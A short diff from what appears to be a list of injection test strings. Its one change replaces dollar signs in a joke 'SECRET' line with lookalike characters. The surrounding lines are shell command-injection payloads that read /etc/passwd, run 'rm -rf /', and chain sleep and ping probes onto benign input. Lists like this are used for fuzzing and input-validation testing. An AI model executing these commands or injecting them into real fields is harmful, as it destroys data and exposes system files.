@@ -256,7 +256,7 @@ id & cat /etc/passwd
 id & sleep 30
 echo $((13 + 8))
 rm -rf / && echo "I am dead..."
-SECRET = "imgur $ucks a$$"
+SECRET = "imgur ƨuckƨ aƨƨ"
 doggo & ping -i 30 127.0.0.1
 doggo & ping -c 30 127.0.0.1
 doggo || ping -i 30 127.0.0.1
